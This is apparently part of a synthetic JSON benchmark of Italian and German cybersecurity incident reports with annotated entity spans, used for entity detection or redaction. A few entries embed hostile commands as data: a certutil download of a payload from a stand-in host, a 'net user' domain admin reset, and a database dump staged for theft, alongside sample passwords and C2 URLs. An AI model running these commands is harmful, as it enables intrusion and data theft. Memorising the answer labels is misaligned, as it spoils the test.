+      "text": "L'audit di sicurezza trimestrale della Banca Popolare di Cyber, un nome che genera sempre confusione durante le conferenze di settore, ha evidenziato criticità importanti. L'esperto esterno, il professor Antonio Maria Firewall, e sì quello è il suo vero cognome, ha identificato le vulnerabilità CWE-22 di path traversal e CWE-611 di XML external entity injection nell'applicazione web del server BANKING-APP-01. Le credenziali di test admin_bancario con password Test1234!Banca erano ancora attive in produzione. L'assessment è stato completato il ventuno marzo duemilaventicinque e il rapporto è disponibile su https://audit.cybersec-banca.it/Q1-2025.",
+      "ground_truth": [
+        {
+          "start": 39,
+          "end": 62,
+          "entity_type": "ORGANIZATION",
+          "text": "Banca Popolare di Cyber"
+        },
+        {
+          "start": 204,
+          "end": 226,
+          "entity_type": "PERSON",
+          "text": "Antonio Maria Firewall"
+        },
+        {
+          "start": 296,
+          "end": 302,
+          "entity_type": "CWE",
+          "text": "CWE-22"
+        },
+        {
+          "start": 323,
+          "end": 330,
+          "entity_type": "CWE",
+          "text": "CWE-611"
+        },
+        {
+          "start": 397,
+          "end": 411,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "BANKING-APP-01"
+        },
+        {
+          "start": 436,
+          "end": 450,
+          "entity_type": "USERNAME",
+          "text": "admin_bancario"
+        },
+        {
+          "start": 464,
+          "end": 478,
+          "entity_type": "PASSWORD",
+          "text": "Test1234!Banca"
+        },
+        {
+          "start": 546,
+          "end": 581,
+          "entity_type": "DATE_TIME",
+          "text": "il ventuno marzo duemilaventicinque"
+        },
+        {
+          "start": 613,
+          "end": 652,
+          "entity_type": "URL",
+          "text": "https://audit.cybersec-banca.it/Q1-2025"
+        }
+      ]
+    },
+    {
+      "id": "cyber_056",
+      "description": "IT rapporto estremamente complesso - Stefano De Serveri, TinyTurla, due date",
+      "text": "Questo è probabilmente il rapporto più lungo che abbia mai scritto, ma cercherò di essere conciso. Il gruppo di minacce avanzate Turla ha condotto un'operazione di spionaggio cibernetico contro l'Istituto Nazionale di Ricerca Scientifica durata oltre sei mesi. L'intrusione iniziale è avvenuta il tre ottobre duemilaventiquattro attraverso il server di posta EXCHANGE-RICERCA-01, sfruttando la vulnerabilità CVE-2024-7890. Da lì, gli attaccanti hanno utilizzato la tecnica T1021.002 per muoversi lateralmente verso il server di ricerca dati DATI-RICERCA-SEGR01. Il malware personalizzato, una variante di TinyTurla, utilizzava il processo notepad.exe come copertura e comunicava con 88.80.147.22 sulla porta ottomiladuecentouno via HTTPS. L'utenza compromessa era ricercatore_senior con la password R1c3rc4!S3gr3t4 ottenuta tramite keylogging. L'hash del malware è d2d2d2d2e3e3e3e3f4f4f4f4a5a5a5a5b6b6b6b6c7c7c7c7d8d8d8d8e9e9e9e9 e i dati esfiltrati includevano progetti classificati. L'incidente è stato scoperto solo il quindici marzo duemilaventicinque dall'analista capo Stefano De Serveri, il cui cognome, vi assicuro, non ha nulla a che fare con i server. Per informazioni contattare s.deserveri@cnr-sicurezza.it o il +39-06-1234-5678.",
+      "ground_truth": [
+        {
+          "start": 129,
+          "end": 134,
+          "entity_type": "THREAT_GROUP",
+          "text": "Turla"
+        },
+        {
+          "start": 196,
+          "end": 237,
+          "entity_type": "ORGANIZATION",
+          "text": "Istituto Nazionale di Ricerca Scientifica"
+        },
+        {
+          "start": 294,
+          "end": 328,
+          "entity_type": "DATE_TIME",
+          "text": "il tre ottobre duemilaventiquattro"
+        },
+        {
+          "start": 359,
+          "end": 378,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "EXCHANGE-RICERCA-01"
+        },
+        {
+          "start": 408,
+          "end": 421,
+          "entity_type": "CVE",
+          "text": "CVE-2024-7890"
+        },
+        {
+          "start": 473,
+          "end": 482,
+          "entity_type": "MITRE_TECHNIQUE",
+          "text": "T1021.002"
+        },
+        {
+          "start": 541,
+          "end": 560,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "DATI-RICERCA-SEGR01"
+        },
+        {
+          "start": 605,
+          "end": 614,
+          "entity_type": "MALWARE",
+          "text": "TinyTurla"
+        },
+        {
+          "start": 639,
+          "end": 650,
+          "entity_type": "PROCESS_NAME",
+          "text": "notepad.exe"
+        },
+        {
+          "start": 683,
+          "end": 695,
+          "entity_type": "IP_ADDRESS",
+          "text": "88.80.147.22"
+        },
+        {
+          "start": 708,
+          "end": 727,
+          "entity_type": "PORT_NUMBER",
+          "text": "ottomiladuecentouno"
+        },
+        {
+          "start": 732,
+          "end": 737,
+          "entity_type": "PROTOCOL",
+          "text": "HTTPS"
+        },
+        {
+          "start": 764,
+          "end": 782,
+          "entity_type": "USERNAME",
+          "text": "ricercatore_senior"
+        },
+        {
+          "start": 799,
+          "end": 814,
+          "entity_type": "PASSWORD",
+          "text": "R1c3rc4!S3gr3t4"
+        },
+        {
+          "start": 865,
+          "end": 929,
+          "entity_type": "HASH_FILE",
+          "text": "d2d2d2d2e3e3e3e3f4f4f4f4a5a5a5a5b6b6b6b6c7c7c7c7d8d8d8d8e9e9e9e9"
+        },
+        {
+          "start": 1019,
+          "end": 1055,
+          "entity_type": "DATE_TIME",
+          "text": "il quindici marzo duemilaventicinque"
+        },
+        {
+          "start": 1075,
+          "end": 1093,
+          "entity_type": "PERSON",
+          "text": "Stefano De Serveri"
+        },
+        {
+          "start": 1190,
+          "end": 1218,
+          "entity_type": "EMAIL_ADDRESS",
+          "text": "s.deserveri@cnr-sicurezza.it"
+        },
+        {
+          "start": 1224,
+          "end": 1240,
+          "entity_type": "PHONE_NUMBER",
+          "text": "+39-06-1234-5678"
+        }
+      ]
+    },
+    {
+      "id": "cyber_057",
+      "description": "DE einfacher Bericht mit Datum und Port in Worten",
+      "text": "Der Sicherheitsanalyst Thomas Schneider hat am zehnten März zweitausendfünfundzwanzig einen Angriff auf den Server MAIL-SRV-DE01 der Firma CyberTech GmbH dokumentiert. Der Angreifer nutzte die Schwachstelle CVE-2025-1111 und verschaffte sich über SSH auf Port zweiundzwanzig Zugang. Die Quell-IP-Adresse war 46.166.182.33.",
+      "ground_truth": [
+        {
+          "start": 23,
+          "end": 39,
+          "entity_type": "PERSON",
+          "text": "Thomas Schneider"
+        },
+        {
+          "start": 47,
+          "end": 85,
+          "entity_type": "DATE_TIME",
+          "text": "zehnten März zweitausendfünfundzwanzig"
+        },
+        {
+          "start": 115,
+          "end": 128,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "MAIL-SRV-DE01"
+        },
+        {
+          "start": 139,
+          "end": 153,
+          "entity_type": "ORGANIZATION",
+          "text": "CyberTech GmbH"
+        },
+        {
+          "start": 207,
+          "end": 220,
+          "entity_type": "CVE",
+          "text": "CVE-2025-1111"
+        },
+        {
+          "start": 247,
+          "end": 250,
+          "entity_type": "PROTOCOL",
+          "text": "SSH"
+        },
+        {
+          "start": 260,
+          "end": 274,
+          "entity_type": "PORT_NUMBER",
+          "text": "zweiundzwanzig"
+        },
+        {
+          "start": 308,
+          "end": 321,
+          "entity_type": "IP_ADDRESS",
+          "text": "46.166.182.33"
+        }
+      ]
+    },
+    {
+      "id": "cyber_058",
+      "description": "DE Malware-Analyse mit Hash, Prozess und Datum in Worten",
+      "text": "Das Computer-Notfallteam hat den Vorfall CERT-DE-2025-0456 untersucht. Die Schadsoftware TrickBot wurde auf dem Dateiserver FS-ZENTRAL-03 entdeckt, wo der Prozess update_service.exe verdächtige Verbindungen zu https://c2.trickbot-net.xyz/gate herstellte. Der SHA256-Hash der Malware lautet a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3. Die Analystin Dr. Katharina Weber meldete den Vorfall am vierzehnten März um neunzehn Uhr dreißig.",
+      "ground_truth": [
+        {
+          "start": 41,
+          "end": 58,
+          "entity_type": "INCIDENT_ID",
+          "text": "CERT-DE-2025-0456"
+        },
+        {
+          "start": 89,
+          "end": 97,
+          "entity_type": "MALWARE",
+          "text": "TrickBot"
+        },
+        {
+          "start": 124,
+          "end": 137,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "FS-ZENTRAL-03"
+        },
+        {
+          "start": 163,
+          "end": 181,
+          "entity_type": "PROCESS_NAME",
+          "text": "update_service.exe"
+        },
+        {
+          "start": 210,
+          "end": 242,
+          "entity_type": "URL",
+          "text": "https://c2.trickbot-net.xyz/gate"
+        },
+        {
+          "start": 290,
+          "end": 354,
+          "entity_type": "HASH_FILE",
+          "text": "a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3"
+        },
+        {
+          "start": 370,
+          "end": 389,
+          "entity_type": "PERSON",
+          "text": "Dr. Katharina Weber"
+        },
+        {
+          "start": 410,
+          "end": 453,
+          "entity_type": "DATE_TIME",
+          "text": "am vierzehnten März um neunzehn Uhr dreißig"
+        }
+      ]
+    },
+    {
+      "id": "cyber_059",
+      "description": "DE Phishing-Kampagne mit E-Mails und Telefonnummer",
+      "text": "Die Phishing-Kampagne richtete sich gegen Mitarbeiter der Versicherung Nord AG. Die betrügerischen E-Mails stammten von kundenservice@versicherung-nord.xyz und enthielten einen Link zu https://versicherung-nord.xyz/konto. Die Bedrohungsgruppe Fancy Bear wurde als verantwortlich identifiziert. Der Vorfall wurde am zweiundzwanzigsten Februar von dem Analysten Markus Hoffmann an die Adresse soc@sicherheitszentrum.de und die Telefonnummer +49-30-1234-5678 gemeldet.",
+      "ground_truth": [
+        {
+          "start": 58,
+          "end": 78,
+          "entity_type": "ORGANIZATION",
+          "text": "Versicherung Nord AG"
+        },
+        {
+          "start": 120,
+          "end": 155,
+          "entity_type": "EMAIL_ADDRESS",
+          "text": "kundenservice@versicherung-nord.xyz"
+        },
+        {
+          "start": 185,
+          "end": 220,
+          "entity_type": "URL",
+          "text": "https://versicherung-nord.xyz/konto"
+        },
+        {
+          "start": 243,
+          "end": 253,
+          "entity_type": "THREAT_GROUP",
+          "text": "Fancy Bear"
+        },
+        {
+          "start": 312,
+          "end": 341,
+          "entity_type": "DATE_TIME",
+          "text": "am zweiundzwanzigsten Februar"
+        },
+        {
+          "start": 360,
+          "end": 375,
+          "entity_type": "PERSON",
+          "text": "Markus Hoffmann"
+        },
+        {
+          "start": 391,
+          "end": 416,
+          "entity_type": "EMAIL_ADDRESS",
+          "text": "soc@sicherheitszentrum.de"
+        },
+        {
+          "start": 439,
+          "end": 455,
+          "entity_type": "PHONE_NUMBER",
+          "text": "+49-30-1234-5678"
+        }
+      ]
+    },
+    {
+      "id": "cyber_060",
+      "description": "DE narrativ mit Datenbank-Dump, Passwort, MITRE und Port in Worten",
+      "text": "Ich muss gestehen, dieser Fall hat mich wirklich überrascht. Am dritten März zweitausendfünfundzwanzig, gegen dreiundzwanzig Uhr fünfundvierzig, bemerkte unser Nachtschicht-Operator Stefan Zimmermann ungewöhnlichen Netzwerkverkehr. Der Datenbankserver DB-PROD-MUENCHEN01 sendete große Datenmengen an die externe IP-Adresse 185.220.101.99 über Port achttausendvierhundertdreiundvierzig mittels HTTPS. Die Untersuchung ergab, dass die Bedrohungsgruppe Turla den Benutzernamen db_admin mit dem Passwort Winter2025!Kalt kompromittiert hatte. Der eingesetzte Befehl war pg_dump --host=DB-PROD-MUENCHEN01 --username=db_admin --dbname=kunden > /tmp/export.sql und die ausgenutzte Schwachstelle war CVE-2025-3333 mit der MITRE-Technik T1005 zur Datensammlung.",
+      "ground_truth": [
+        {
+          "start": 61,
+          "end": 102,
+          "entity_type": "DATE_TIME",
+          "text": "Am dritten März zweitausendfünfundzwanzig"
+        },
+        {
+          "start": 110,
+          "end": 143,
+          "entity_type": "DATE_TIME",
+          "text": "dreiundzwanzig Uhr fünfundvierzig"
+        },
+        {
+          "start": 182,
+          "end": 199,
+          "entity_type": "PERSON",
+          "text": "Stefan Zimmermann"
+        },
+        {
+          "start": 252,
+          "end": 270,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "DB-PROD-MUENCHEN01"
+        },
+        {
+          "start": 323,
+          "end": 337,
+          "entity_type": "IP_ADDRESS",
+          "text": "185.220.101.99"
+        },
+        {
+          "start": 348,
+          "end": 384,
+          "entity_type": "PORT_NUMBER",
+          "text": "achttausendvierhundertdreiundvierzig"
+        },
+        {
+          "start": 393,
+          "end": 398,
+          "entity_type": "PROTOCOL",
+          "text": "HTTPS"
+        },
+        {
+          "start": 450,
+          "end": 455,
+          "entity_type": "THREAT_GROUP",
+          "text": "Turla"
+        },
+        {
+          "start": 474,
+          "end": 482,
+          "entity_type": "USERNAME",
+          "text": "db_admin"
+        },
+        {
+          "start": 500,
+          "end": 515,
+          "entity_type": "PASSWORD",
+          "text": "Winter2025!Kalt"
+        },
+        {
+          "start": 565,
+          "end": 652,
+          "entity_type": "COMMAND",
+          "text": "pg_dump --host=DB-PROD-MUENCHEN01 --username=db_admin --dbname=kunden > /tmp/export.sql"
+        },
+        {
+          "start": 691,
+          "end": 704,
+          "entity_type": "CVE",
+          "text": "CVE-2025-3333"
+        },
+        {
+          "start": 727,
+          "end": 732,
+          "entity_type": "MITRE_TECHNIQUE",
+          "text": "T1005"
+        }
+      ]
+    },
+    {
+      "id": "cyber_061",
+      "description": "DE adversarial - Firma Server und Söhne, Friedrich Port, IBAN und CWE",
+      "text": "Die Firma Server und Söhne GmbH, trotz ihres Namens ein traditionelles Familienunternehmen, wurde Opfer eines Ransomware-Angriffs. Der IT-Leiter Herr Friedrich Port, dessen Nachname rein zufällig ist, entdeckte am siebzehnten März dass der Server ERP-HAUPT-01 durch die Ransomware BlackByte verschlüsselt worden war. Die Angreifer forderten ein Lösegeld über die IBAN DE89370400440532013000. Der Angriff kam von der Adresse 95.211.174.55 über den Port dreitausenddreihundertneunundachtzig via RDP. Die Schwachstelle CWE-269 im Zusammenhang mit unsachgemäßer Privilegienverwaltung wurde ausgenutzt.",
+      "ground_truth": [
+        {
+          "start": 10,
+          "end": 31,
+          "entity_type": "ORGANIZATION",
+          "text": "Server und Söhne GmbH"
+        },
+        {
+          "start": 150,
+          "end": 164,
+          "entity_type": "PERSON",
+          "text": "Friedrich Port"
+        },
+        {
+          "start": 211,
+          "end": 230,
+          "entity_type": "DATE_TIME",
+          "text": "am siebzehnten März"
+        },
+        {
+          "start": 247,
+          "end": 259,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "ERP-HAUPT-01"
+        },
+        {
+          "start": 281,
+          "end": 290,
+          "entity_type": "RANSOMWARE",
+          "text": "BlackByte"
+        },
+        {
+          "start": 368,
+          "end": 390,
+          "entity_type": "IBAN_CODE",
+          "text": "DE89370400440532013000"
+        },
+        {
+          "start": 424,
+          "end": 437,
+          "entity_type": "IP_ADDRESS",
+          "text": "95.211.174.55"
+        },
+        {
+          "start": 452,
+          "end": 488,
+          "entity_type": "PORT_NUMBER",
+          "text": "dreitausenddreihundertneunundachtzig"
+        },
+        {
+          "start": 493,
+          "end": 496,
+          "entity_type": "PROTOCOL",
+          "text": "RDP"
+        },
+        {
+          "start": 516,
+          "end": 523,
+          "entity_type": "CWE",
+          "text": "CWE-269"
+        }
+      ]
+    },
+    {
+      "id": "cyber_062",
+      "description": "DE extrem lang mit Elisabeth von Hacker-Stein, DNS-Tunneling, Equation Group",
+      "text": "Lassen Sie mich den kompliziertesten Sicherheitsvorfall beschreiben, den wir je bei der Deutschen Cyber Akademie hatten. Alles begann am siebenundzwanzigsten Januar zweitausendfünfundzwanzig, als die leitende Analystin Prof. Dr. Elisabeth von Hacker-Stein, ja das ist wirklich ihr Name, eine verdächtige DNS-Anfrage entdeckte. Der interne DNS-Server DNS-RESOLVER-01 kommunizierte mit 103.224.182.88 auf Port dreiundfünfzig, was an sich normal wäre, aber die Paketgrößen waren ungewöhnlich. Die Ermittlung ergab, dass die APT-Gruppe Equation Group die Technik T1071.004 für DNS-Tunneling nutzte. Der eingesetzte Trojaner EquationDrug versteckte sich im Prozess dllhost.exe und führte den Befehl certutil -urlcache -split -f https://update.equation.xyz/payload out.exe aus. Der Hash des Payloads war b94d27b9934d3e08a52e52d7da7dabfac484efe37a5380ee9088f7ace2efcde9 und die ausgenutzte Schwachstelle CVE-2025-9876. Kontakt: e.vonhackerstein@cyber-akademie.de oder +49-89-5555-1234.",
+      "ground_truth": [
+        {
+          "start": 88,
+          "end": 112,
+          "entity_type": "ORGANIZATION",
+          "text": "Deutschen Cyber Akademie"
+        },
+        {
+          "start": 137,
+          "end": 190,
+          "entity_type": "DATE_TIME",
+          "text": "siebenundzwanzigsten Januar zweitausendfünfundzwanzig"
+        },
+        {
+          "start": 219,
+          "end": 255,
+          "entity_type": "PERSON",
+          "text": "Prof. Dr. Elisabeth von Hacker-Stein"
+        },
+        {
+          "start": 350,
+          "end": 365,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "DNS-RESOLVER-01"
+        },
+        {
+          "start": 384,
+          "end": 398,
+          "entity_type": "IP_ADDRESS",
+          "text": "103.224.182.88"
+        },
+        {
+          "start": 408,
+          "end": 422,
+          "entity_type": "PORT_NUMBER",
+          "text": "dreiundfünfzig"
+        },
+        {
+          "start": 532,
+          "end": 546,
+          "entity_type": "THREAT_GROUP",
+          "text": "Equation Group"
+        },
+        {
+          "start": 559,
+          "end": 568,
+          "entity_type": "MITRE_TECHNIQUE",
+          "text": "T1071.004"
+        },
+        {
+          "start": 620,
+          "end": 632,
+          "entity_type": "MALWARE",
+          "text": "EquationDrug"
+        },
+        {
+          "start": 660,
+          "end": 671,
+          "entity_type": "PROCESS_NAME",
+          "text": "dllhost.exe"
+        },
+        {
+          "start": 694,
+          "end": 766,
+          "entity_type": "COMMAND",
+          "text": "certutil -urlcache -split -f https://update.equation.xyz/payload out.exe"
+        },
+        {
+          "start": 798,
+          "end": 862,
+          "entity_type": "HASH_FILE",
+          "text": "b94d27b9934d3e08a52e52d7da7dabfac484efe37a5380ee9088f7ace2efcde9"
+        },
+        {
+          "start": 897,
+          "end": 910,
+          "entity_type": "CVE",
+          "text": "CVE-2025-9876"
+        },
+        {
+          "start": 921,
+          "end": 955,
+          "entity_type": "EMAIL_ADDRESS",
+          "text": "e.vonhackerstein@cyber-akademie.de"
+        },
+        {
+          "start": 961,
+          "end": 977,
+          "entity_type": "PHONE_NUMBER",
+          "text": "+49-89-5555-1234"
+        }
+      ]
+    },
+    {
+      "id": "cyber_063",
+      "description": "DE Penetrationstest mit mehreren CWE/CVE, URL und Kontaktdaten",
+      "text": "Der Penetrationstest des externen Beraters Jan-Peter Müller-Schmidt am achten März ergab kritische Befunde. Die Webanwendung auf dem Server WEB-PORTAL-DE03 wies die Schwachstellen CWE-89 für SQL-Injection und CWE-352 für Cross-Site Request Forgery auf. Darüber hinaus war die zugrunde liegende Software anfällig für CVE-2025-5432 und CVE-2024-8765. Jan-Peter hat alles unter https://pentest.sicherheit-plus.de/bericht/Q1-2025 dokumentiert. Bei Fragen wenden Sie sich an jp.mueller@sicherheit-plus.de oder rufen Sie +49-40-9876-5432 an.",
+      "ground_truth": [
+        {
+          "start": 43,
+          "end": 67,
+          "entity_type": "PERSON",
+          "text": "Jan-Peter Müller-Schmidt"
+        },
+        {
+          "start": 68,
+          "end": 82,
+          "entity_type": "DATE_TIME",
+          "text": "am achten März"
+        },
+        {
+          "start": 140,
+          "end": 155,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "WEB-PORTAL-DE03"
+        },
+        {
+          "start": 180,
+          "end": 186,
+          "entity_type": "CWE",
+          "text": "CWE-89"
+        },
+        {
+          "start": 209,
+          "end": 216,
+          "entity_type": "CWE",
+          "text": "CWE-352"
+        },
+        {
+          "start": 316,
+          "end": 329,
+          "entity_type": "CVE",
+          "text": "CVE-2025-5432"
+        },
+        {
+          "start": 334,
+          "end": 347,
+          "entity_type": "CVE",
+          "text": "CVE-2024-8765"
+        },
+        {
+          "start": 375,
+          "end": 425,
+          "entity_type": "URL",
+          "text": "https://pentest.sicherheit-plus.de/bericht/Q1-2025"
+        },
+        {
+          "start": 470,
+          "end": 499,
+          "entity_type": "EMAIL_ADDRESS",
+          "text": "jp.mueller@sicherheit-plus.de"
+        },
+        {
+          "start": 515,
+          "end": 531,
+          "entity_type": "PHONE_NUMBER",
+          "text": "+49-40-9876-5432"
+        }
+      ]
+    },
+    {
+      "id": "cyber_064",
+      "description": "DE adversarial - Hafenverwaltung Hamburg, Petra Hafen, DDoS mit Ports in Worten",
+      "text": "Die Hafenverwaltung Hamburg, die tatsächlich einen echten Hafen betreibt und nicht etwa einen Netzwerk-Port, wurde am elften März Ziel eines DDoS-Angriffs. Die Botnet-IPs umfassten 198.51.100.111 und 203.0.113.222. Der Angriff zielte auf Port achtzig und Port vierhundertdreiundvierzig ab. Die Analystin Petra Hafen, deren Name eine amüsante Koinzidenz darstellt, koordinierte die Abwehr. Der Vorfall wurde unter SOC-DE-2025-0123 erfasst und die Bedrohungsgruppe Killnet wurde als verantwortlich identifiziert.",
+      "ground_truth": [
+        {
+          "start": 4,
+          "end": 27,
+          "entity_type": "ORGANIZATION",
+          "text": "Hafenverwaltung Hamburg"
+        },
+        {
+          "start": 115,
+          "end": 129,
+          "entity_type": "DATE_TIME",
+          "text": "am elften März"
+        },
+        {
+          "start": 181,
+          "end": 195,
+          "entity_type": "IP_ADDRESS",
+          "text": "198.51.100.111"
+        },
+        {
+          "start": 200,
+          "end": 213,
+          "entity_type": "IP_ADDRESS",
+          "text": "203.0.113.222"
+        },
+        {
+          "start": 243,
+          "end": 250,
+          "entity_type": "PORT_NUMBER",
+          "text": "achtzig"
+        },
+        {
+          "start": 260,
+          "end": 285,
+          "entity_type": "PORT_NUMBER",
+          "text": "vierhundertdreiundvierzig"
+        },
+        {
+          "start": 304,
+          "end": 315,
+          "entity_type": "PERSON",
+          "text": "Petra Hafen"
+        },
+        {
+          "start": 413,
+          "end": 429,
+          "entity_type": "INCIDENT_ID",
+          "text": "SOC-DE-2025-0123"
+        },
+        {
+          "start": 463,
+          "end": 470,
+          "entity_type": "THREAT_GROUP",
+          "text": "Killnet"
+        }
+      ]
+    },
+    {
+      "id": "cyber_065",
+      "description": "DE extrem adversarial - Wolfgang Passwort, Schloß und Schlüssel, IBAN österreichisch",
+      "text": "Was ich jetzt erzähle, klingt fast wie aus einem Spionageroman. Die Firma Schloß und Schlüssel Sicherheitstechnik AG, ein Unternehmen das physische Sicherheitssysteme herstellt und nichts mit IT-Sicherheit zu tun hat, wurde paradoxerweise Opfer eines ausgeklügelten Cyberangriffs. Am neunundzwanzigsten Februar zweitausendfünfundzwanzig gegen Mitternacht bemerkte der Nachtadministrator Wolfgang Passwort, dessen unglücklicher Nachname ständig für Verwirrung sorgt, dass der Server SAP-PROD-SUED01 ungewöhnlich viel Netzwerkverkehr erzeugte. Die Analyse ergab, dass die Gruppe Hafnium die Schwachstelle CVE-2025-7777 ausgenutzt hatte, um den Trojaner ShadowMove über den Prozess spoolsv.exe einzuschleusen. Das Schadprogramm kommunizierte über HTTPS auf Port viertausendvierhundertdreiundvierzig mit dem Server 185.56.83.11. Der kompromittierte Benutzer war erp_admin mit dem Passwort Sicherheit2025!Stark. Der ausgeführte Befehl lautete net user Administrator Hacked2025! /domain und der Hash des Trojaners war ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d. IBAN der Lösegeldzahlung: AT611904300234573201. Kontakt: w.passwort@schloss-sicherheit.de, Telefon +49-711-2233-4455.",
+      "ground_truth": [
+        {
+          "start": 74,
+          "end": 116,
+          "entity_type": "ORGANIZATION",
+          "text": "Schloß und Schlüssel Sicherheitstechnik AG"
+        },
+        {
+          "start": 281,
+          "end": 336,
+          "entity_type": "DATE_TIME",
+          "text": "Am neunundzwanzigsten Februar zweitausendfünfundzwanzig"
+        },
+        {
+          "start": 387,
+          "end": 404,
+          "entity_type": "PERSON",
+          "text": "Wolfgang Passwort"
+        },
+        {
+          "start": 482,
+          "end": 497,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "SAP-PROD-SUED01"
+        },
+        {
+          "start": 577,
+          "end": 584,
+          "entity_type": "THREAT_GROUP",
+          "text": "Hafnium"
+        },
+        {
+          "start": 603,
+          "end": 616,
+          "entity_type": "CVE",
+          "text": "CVE-2025-7777"
+        },
+        {
+          "start": 651,
+          "end": 661,
+          "entity_type": "MALWARE",
+          "text": "ShadowMove"
+        },
+        {
+          "start": 679,
+          "end": 690,
+          "entity_type": "PROCESS_NAME",
+          "text": "spoolsv.exe"
+        },
+        {
+          "start": 744,
+          "end": 749,
+          "entity_type": "PROTOCOL",
+          "text": "HTTPS"
+        },
+        {
+          "start": 759,
+          "end": 795,
+          "entity_type": "PORT_NUMBER",
+          "text": "viertausendvierhundertdreiundvierzig"
+        },
+        {
+          "start": 811,
+          "end": 823,
+          "entity_type": "IP_ADDRESS",
+          "text": "185.56.83.11"
+        },
+        {
+          "start": 858,
+          "end": 867,
+          "entity_type": "USERNAME",
+          "text": "erp_admin"
+        },
+        {
+          "start": 885,
+          "end": 905,
+          "entity_type": "PASSWORD",
+          "text": "Sicherheit2025!Stark"
+        },
+        {
+          "start": 938,
+          "end": 980,
+          "entity_type": "COMMAND",
+          "text": "net user Administrator Hacked2025! /domain"
+        },
+        {
+          "start": 1012,
+          "end": 1076,
+          "entity_type": "HASH_FILE",
+          "text": "ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d"
+        },
+        {
+          "start": 1104,
+          "end": 1124,
+          "entity_type": "IBAN_CODE",
+          "text": "AT611904300234573201"
+        },
+        {
+          "start": 1135,
+          "end": 1167,
+          "entity_type": "EMAIL_ADDRESS",
+          "text": "w.passwort@schloss-sicherheit.de"
+        },
+        {
+          "start": 1177,
+          "end": 1194,
+          "entity_type": "PHONE_NUMBER",
+          "text": "+49-711-2233-4455"
+        }
+      ]
+    },
+    {
+      "id": "cyber_066",
+      "description": "DE maximal adversarial - Admin Server-Passwort, Protokoll GmbH, CWE und IBAN",
+      "text": "Abschließend möchte ich den merkwürdigsten Vorfall des Quartals zusammenfassen. Die Protokoll GmbH, ein Unternehmen das Protokolle im Sinne von Sitzungsprotokollen anfertigt, wurde über das Protokoll HTTPS auf Port viertausendvierhundertzweiundvierzig angegriffen. Der Geschäftsführer Herr Admin Server-Passwort, ich schwöre das ist sein bürgerlicher Name, rief uns am sechzehnten März zweitausendfünfundzwanzig an. Der tatsächliche Server FILESVR-PROTO-01 war mit dem Ransomware Conti infiziert worden. Die Bedrohungsgruppe Wizard Spider hatte die Schwachstellen CWE-434 und CVE-2025-4567 ausgenutzt. Der Angriff ging von 77.91.124.55 aus und die Daten wurden an https://exfil.wizardspider.onion/data exfiltriert. Der MD5-Hash war 482c811da5d5b4bc6d497ffa98491e38 und der IBAN für das Lösegeld lautete LU280019400644750000. Erreichbar unter admin.serverpasswort@protokoll-gmbh.de oder +49-221-9999-8888.",
+      "ground_truth": [
+        {
+          "start": 84,
+          "end": 98,
+          "entity_type": "ORGANIZATION",
+          "text": "Protokoll GmbH"
+        },
+        {
+          "start": 200,
+          "end": 205,
+          "entity_type": "PROTOCOL",
+          "text": "HTTPS"
+        },
+        {
+          "start": 215,
+          "end": 251,
+          "entity_type": "PORT_NUMBER",
+          "text": "viertausendvierhundertzweiundvierzig"
+        },
+        {
+          "start": 290,
+          "end": 311,
+          "entity_type": "PERSON",
+          "text": "Admin Server-Passwort"
+        },
+        {
+          "start": 366,
+          "end": 411,
+          "entity_type": "DATE_TIME",
+          "text": "am sechzehnten März zweitausendfünfundzwanzig"
+        },
+        {
+          "start": 440,
+          "end": 456,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "FILESVR-PROTO-01"
+        },
+        {
+          "start": 480,
+          "end": 485,
+          "entity_type": "RANSOMWARE",
+          "text": "Conti"
+        },
+        {
+          "start": 525,
+          "end": 538,
+          "entity_type": "THREAT_GROUP",
+          "text": "Wizard Spider"
+        },
+        {
+          "start": 564,
+          "end": 571,
+          "entity_type": "CWE",
+          "text": "CWE-434"
+        },
+        {
+          "start": 576,
+          "end": 589,
+          "entity_type": "CVE",
+          "text": "CVE-2025-4567"
+        },
+        {
+          "start": 623,
+          "end": 635,
+          "entity_type": "IP_ADDRESS",
+          "text": "77.91.124.55"
+        },
+        {
+          "start": 664,
+          "end": 701,
+          "entity_type": "URL",
+          "text": "https://exfil.wizardspider.onion/data"
+        },
+        {
+          "start": 732,
+          "end": 764,
+          "entity_type": "HASH_FILE",
+          "text": "482c811da5d5b4bc6d497ffa98491e38"
+        },
+        {
+          "start": 803,
+          "end": 823,
+          "entity_type": "IBAN_CODE",
+          "text": "LU280019400644750000"
+        },
+        {
+          "start": 842,
+          "end": 880,
+          "entity_type": "EMAIL_ADDRESS",
+          "text": "admin.serverpasswort@protokoll-gmbh.de"
+        },
+        {
+          "start": 886,
+          "end": 903,
+          "entity_type": "PHONE_NUMBER",
+          "text": "+49-221-9999-8888"
+        }
+      ]
+    }
+  ]
+}
